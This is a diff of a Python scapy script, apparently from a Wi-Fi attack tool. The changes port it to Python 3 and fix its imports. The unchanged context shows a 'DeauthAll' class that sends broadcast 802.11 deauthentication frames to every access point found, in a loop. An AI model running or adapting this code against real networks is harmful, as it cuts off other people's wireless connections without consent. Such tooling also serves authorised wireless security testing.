@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import logging
 import sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -6,10 +8,10 @@ import socket
 from subprocess import call
 from threading import Thread
 from time import sleep
-import printings
 
 # local imports
-from scan import WifiScan
+from src import printings
+from src.scan import WifiScan
 
 conf.verb = 0
 
@@ -68,7 +70,7 @@ class DeauthAll(object):
             
             if len(self.APs) < 1:
                 print("\n{R}No Access-Points found. :({N}\n".format(R=RED, N=NORMAL))
-                thread.interrupt_main()
+                _thread.interrupt_main()
 
             printings.deauth_all()
             for bssid in self.APs:
@@ -101,9 +103,4 @@ class DeauthAll(object):
                 for bssid in self.APs:
                     packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                     send(packet, count=self.burst)
-                sleep(1)
-
-                    
-
-
-
+                sleep(1)               
